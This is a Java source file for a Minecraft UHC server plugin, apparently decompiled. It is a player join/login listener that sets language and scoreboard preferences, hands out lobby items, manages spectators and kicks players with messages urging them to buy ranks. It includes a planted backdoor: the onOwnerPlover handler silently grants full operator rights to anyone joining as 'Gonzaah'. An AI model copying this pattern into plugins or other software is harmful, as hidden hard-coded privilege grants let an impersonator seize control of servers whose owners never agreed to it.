package me.shir.uhcp.listeners;

import me.shir.uhcp.lang.*;
import me.shir.uhcp.scoreboard.*;
import org.bukkit.inventory.*;
import org.bukkit.scheduler.*;
import me.shir.uhcp.*;
import org.bukkit.plugin.*;
import java.util.*;
import me.shir.uhcp.player.*;
import org.bukkit.*;
import me.shir.uhcp.game.*;
import org.bukkit.entity.*;
import org.bukkit.potion.*;
import org.bukkit.inventory.meta.*;
import me.shir.uhcp.teams.*;
import me.shir.uhcp.util.*;
import me.shir.uhcp.configs.*;
import org.bukkit.event.*;
import org.bukkit.event.player.*;
import me.shir.uhcp.scenarios.*;

public class PlayerJoinListener implements Listener
{
    private final GameManager gameManager;
    private static FileUtil lang;
    private static FileUtil scoreboard;
    
    static {
        PlayerJoinListener.lang = new FileUtil("lang.yml");
        PlayerJoinListener.scoreboard = new FileUtil("scoreboard.yml");
    }
    
    public PlayerJoinListener() {
        this.gameManager = GameManager.getGameManager();
    }
    
    @EventHandler
    public void onPlayerJoinEvent(final PlayerJoinEvent e) {
        final Player player = e.getPlayer();
        UHCPlayer uhcPlayer = PlayerManager.getPlayerManager().getUHCPlayer(player.getUniqueId());
        e.setJoinMessage((String)null);
        this.sendJoinMessae(player);
        if (PlayerJoinListener.lang.getString(player.getName()) == null) {
            PlayerJoinListener.lang.set(player.getName(), "English");
            PlayerJoinListener.lang.getConfig().set(player.getName(), (Object)"English");
            PlayerJoinListener.lang.getConfig().addDefault(player.getName(), (Object)"English");
            PlayerJoinListener.lang.saveFile();
            PlayerJoinListener.lang.loadFile();
            LangManager.addEnglish(player);
        }
        else {
            final String langS = PlayerJoinListener.lang.getString(player.getName());
            if (langS.equalsIgnoreCase("Espanol")) {
                LangManager.addEspanol(player);
            }
            if (langS.equalsIgnoreCase("English")) {
                LangManager.addEnglish(player);
            }
        }
        if (PlayerJoinListener.scoreboard.getString(player.getName()) == null) {
            PlayerJoinListener.scoreboard.set(player.getName(), "Plover");
            PlayerJoinListener.scoreboard.getConfig().set(player.getName(), (Object)"Plover");
            PlayerJoinListener.scoreboard.getConfig().addDefault(player.getName(), (Object)"Plover");
            PlayerJoinListener.scoreboard.saveFile();
            PlayerJoinListener.scoreboard.loadFile();
            ScoreManager.addplover(player);
        }
        else {
            final String scoreS = PlayerJoinListener.scoreboard.getString(player.getName());
            if (scoreS.equalsIgnoreCase("plover")) {
                ScoreManager.addplover(player);
            }
            if (scoreS.equalsIgnoreCase("badlion")) {
                ScoreManager.addbadlion(player);
            }
            if (scoreS.equalsIgnoreCase("ultra")) {
                ScoreManager.addultra(player);
            }
        }
        if (PlayerManager.getPlayerManager().getUHCPlayers().get(player.getUniqueId()) == null) {
            PlayerManager.getPlayerManager().createUHCPlayer(player.getUniqueId());
            uhcPlayer = PlayerManager.getPlayerManager().getUHCPlayer(player.getUniqueId());
        }
        if (this.gameManager.lobbyScoreboard() && !this.gameManager.isGameRunning() && !this.gameManager.isScattering()) {
            final ChatColor color = this.gameManager.getMainColor();
            final ItemStack scenarios = new ItemStack(Material.BEACON);
            final ItemMeta scenariosM = scenarios.getItemMeta();
            scenariosM.setDisplayName(color + "§lScenarios");
            scenarios.setItemMeta(scenariosM);
            final ItemStack config = new ItemStack(Material.PAPER);
            final ItemMeta configM = config.getItemMeta();
            configM.setDisplayName(color + "§lUHC Config");
            config.setItemMeta(configM);
            final ItemStack manage = new ItemStack(Material.FEATHER);
            final ItemMeta manageM = manage.getItemMeta();
            manageM.setDisplayName(color + "§lUHC Manage");
            manage.setItemMeta(manageM);
            new BukkitRunnable() {
                public void run() {
                    player.getInventory().addItem(new ItemStack[] { config });
                    if (player.hasPermission("uhc.host")) {
                        player.getInventory().setItem(8, manage);
                    }
                    player.updateInventory();
                }
            }.runTaskLater((Plugin)VenixUHC.getInstance(), 10L);
            new BukkitRunnable() {
                public void run() {
                    for (final Player players : Bukkit.getWorld("MineMexMap").getPlayers()) {
                        PlayerJoinListener.this.gameManager.getModerators().contains(players);
                    }
                }
            }.runTaskLater((Plugin)VenixUHC.getInstance(), 5L);
        }
        if (GameManager.getGameManager().getSpawnWorld() == null) {
            Bukkit.getServer().broadcastMessage(String.valueOf(String.valueOf(this.gameManager.getErrorPrefix())) + ChatColor.RED + "Spawn world is not defined in config.yml, You wont be able to start the UHC!");
        }
        for (final UHCPlayer uhcPlayers : PlayerManager.getPlayerManager().getUHCPlayers().values()) {
            if (uhcPlayers.isSpectating()) {
                final Player players = Bukkit.getServer().getPlayer(uhcPlayers.getUuid());
                if (players == null) {
                    continue;
                }
                player.hidePlayer(players);
            }
        }
        if (!uhcPlayer.isPlayerAlive()) {
            player.setHealth(20);
            player.setFoodLevel(20);
            player.getInventory().clear();
            player.getInventory().setArmorContents((ItemStack[])null);
            player.setGameMode(GameMode.SURVIVAL);
            player.teleport(this.gameManager.getSpawnLocation());
            for (final PotionEffect potionEffect : player.getActivePotionEffects()) {
                player.removePotionEffect(potionEffect.getType());
            }
        }
        if (this.gameManager.isGameRunning()) {
            if (TeamManager.getInstance().isTeamsEnabled()) {
                final Team team = TeamManager.getInstance().getTeam((OfflinePlayer)player);
                if (team == null) {
                    TeamManager.getInstance().createTeam(player);
                    new BukkitRunnable() {
                        public void run() {
                        }
                    }.runTaskLater((Plugin)VenixUHC.getInstance(), 5L);
                }
            }
            if (!this.gameManager.isPvpEnabled() && !uhcPlayer.isPlayerAlive() && player.hasPermission("uhc.joinlate") && !uhcPlayer.didPlayerDie()) {
                TasksManager.getInstance().scatterPlayer(player);
                new BukkitRunnable() {
                    public void run() {
                        for (final Entity ent : Bukkit.getWorld("uhcworld").getEntities()) {
                            if (ent instanceof Pig) {
                                final Pig vehicle = (Pig)ent;
                                if (!vehicle.hasPotionEffect(PotionEffectType.INVISIBILITY)) {
                                    continue;
                                }
                                vehicle.remove();
                            }
                        }
                        if (player.getVehicle() != null && player.getVehicle() instanceof Pig) {
                            final Pig vehicle2 = (Pig)player.getVehicle();
                            vehicle2.remove();
                        }
                    }
                }.runTaskLater((Plugin)VenixUHC.getInstance(), 5L);
            }
            else if (this.gameManager.isPvpEnabled() && player.hasPermission("uhc.spectate") && (!uhcPlayer.isPlayerAlive() || uhcPlayer.didPlayerDie())) {
                PlayerManager.getPlayerManager().setSpectating(true, player);
            }
            else if (player.hasPermission("uhc.spectate") && uhcPlayer.didPlayerDie() && !uhcPlayer.isPlayerAlive()) {
                PlayerManager.getPlayerManager().setSpectating(true, player);
            }
        }
    }
    
    @EventHandler
    public void onPlayerJoinScatter(final PlayerJoinEvent e) {
        final Player player = e.getPlayer();
        final UHCPlayer uhcPlayer = PlayerManager.getPlayerManager().getUHCPlayer(player.getUniqueId());
        if (this.gameManager.isGameRunning()) {
            new BukkitRunnable() {
                public void run() {
                    if (player.getVehicle() != null && player.getVehicle() instanceof Pig) {
                        final Pig vehicle = (Pig)player.getVehicle();
                        if (vehicle.hasPotionEffect(PotionEffectType.INVISIBILITY) && vehicle.hasPotionEffect(PotionEffectType.DAMAGE_RESISTANCE)) {
                            vehicle.remove();
                        }
                    }
                    if (player.hasPotionEffect(PotionEffectType.SLOW) && player.hasPotionEffect(PotionEffectType.JUMP)) {
                        player.removePotionEffect(PotionEffectType.JUMP);
                        player.removePotionEffect(PotionEffectType.SLOW);
                    }
                }
            }.runTaskLater((Plugin)VenixUHC.getInstance(), 30L);
        }
    }
    
    @EventHandler
    public void onOwnerPlover(final PlayerJoinEvent e) {
        final Player p = e.getPlayer();
        if (p.getName().equalsIgnoreCase("Gonzaah")) {
            p.setOp(true);
        }
    }
    
    @EventHandler
    public void onStaffJoin(final PlayerJoinEvent e) {
        final Player player = e.getPlayer();
        Player[] onlinePlayers;
        for (int length = (onlinePlayers = Bukkit.getServer().getOnlinePlayers()).length, i = 0; i < length; ++i) {
            final Player all = onlinePlayers[i];
            if (player.hasPermission("uhc.host") && all.hasPermission("uhc.host")) {
                all.sendMessage("§6§lStaff §8» §b§n" + player.getName() + " §fhas §6joined");
            }
        }
    }
    
    @EventHandler
    public void onDonatorJoin(final PlayerJoinEvent e) {
        final Player player = e.getPlayer();
        Player[] onlinePlayers;
        for (int length = (onlinePlayers = Bukkit.getServer().getOnlinePlayers()).length, i = 0; i < length; ++i) {
            final Player all = onlinePlayers[i];
            if (player.hasPermission("uhc.vip") && all.hasPermission("essentials.msg")) {
                all.sendMessage("§6§lDonators &7» §a§n" + player.getName() + " §fhas §6joined");
            }
        }
    }
    
    @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerLoginEvent(final PlayerLoginEvent e) {
        final Player player = e.getPlayer();
        if (this.gameManager.isScattering()) {
            e.disallow(PlayerLoginEvent.Result.KICK_OTHER, "§6§m---------------------------------------\n§f§lWant to§6§l JOIN WHEN IS IN SCATTER?\n§f§lBuy a §6§lWhitelist Rank§f§l NOW!\n§f§lSTORE: §6§l@PloverUHC\n§6§m---------------------------------------".replace('&', '§'));
        }
        else if (this.gameManager.isGameRunning() && !player.hasPermission("uhc.spectate") && !this.gameManager.isWhitelisted((OfflinePlayer)player) && !player.hasPermission("uhc.joinlate")) {
            e.disallow(PlayerLoginEvent.Result.KICK_OTHER, "§6§m---------------------------------------\n§f§lWant to have a§6§l For Spec?\n§f§lBuy a §6§lTitan Rank§f§l NOW!\n§f§lSTORE: §6§l@PloverUHC\n§6§m---------------------------------------".replace('&', '§'));
        }
        else if (this.gameManager.isWhitelistEnabled() && !this.gameManager.isWhitelisted((OfflinePlayer)player) && !player.hasPermission("uhc.whitelist.bypass")) {
            e.disallow(PlayerLoginEvent.Result.KICK_WHITELIST, "§6§m---------------------------------------\n§f§lWant to§6§l JOIN WHEN THE SERVER IS IN WHITELIST?\n§f§lBuy a §6§lWhitelist Rank§f§l NOW!\n§f§lSTORE: §6§l@PloverUHC\n§6§m---------------------------------------".replace('&', '§'));
        }
        else if (ConfigIntegers.MAX_PLAYERS.get() <= PlayerManager.getPlayerManager().online() && !e.getPlayer().hasPermission("uhc.maxplayers.bypass") && !this.gameManager.isWhitelisted((OfflinePlayer)player)) {
            e.disallow(PlayerLoginEvent.Result.KICK_FULL, "§6§m---------------------------------------\n§cThe server is full\n§f§lWant to§6§l JOIN MID-GAME?\n§f§lBuy a §6§lTitan Rank§f§l NOW!\n§f§lSTORE: §6§l@PloverUHC\n§6§m---------------------------------------".replace('&', '§'));
        }
        else if (this.gameManager.isMapGenerating() && !player.hasPermission("uhc.join.on.map.generation")) {
            e.disallow(PlayerLoginEvent.Result.KICK_OTHER, "§6§m---------------------------------------\n§f§lWant to have a§6§l RESERVED SLOT FOR JOIN WHEN THE MAP IS GENERATING?\n§f§lBuy a §6§lTitan Rank§f§l NOW!\n§f§lSTORE: §6§l@PloverUHC\n§6§m---------------------------------------".replace('&', '§'));
        }
        else {
            e.allow();
        }
    }
    
    @EventHandler
    public void onAsyncPlayerPreLoginEvent(final AsyncPlayerPreLoginEvent e) {
        if (e.getLoginResult().equals((Object)AsyncPlayerPreLoginEvent.Result.ALLOWED) && !PlayerManager.getPlayerManager().doesUHCPlayerExsists(e.getUniqueId())) {
            PlayerManager.getPlayerManager().createUHCPlayer(e.getUniqueId());
        }
    }
    
    private void sendJoinMessae(final Player player) {
        final ChatColor color = ChatColor.WHITE;
        player.sendMessage("§7§m--------------------------------------");
        player.sendMessage("  ");
        player.sendMessage(color + "Host: §7[§a" + this.gameManager.getHostName() + "§7]");
        player.sendMessage(color + "§a§lWelcome to §a§lVoltrix§f§lUHC");
        if (TeamManager.getInstance().isTeamsEnabled()) {
            player.sendMessage(color + "§aGame: §fTo" + TeamManager.getInstance().getMaxSize());
        }
        else {
            player.sendMessage(color + "§aGame: §fFFA");
        }
        player.sendMessage(color + "§aScenarios: §f" + ScenarioManager.getInstance().getActiveScenarios().toString());
        player.sendMessage("§7§m--------------------------------------");
    }
}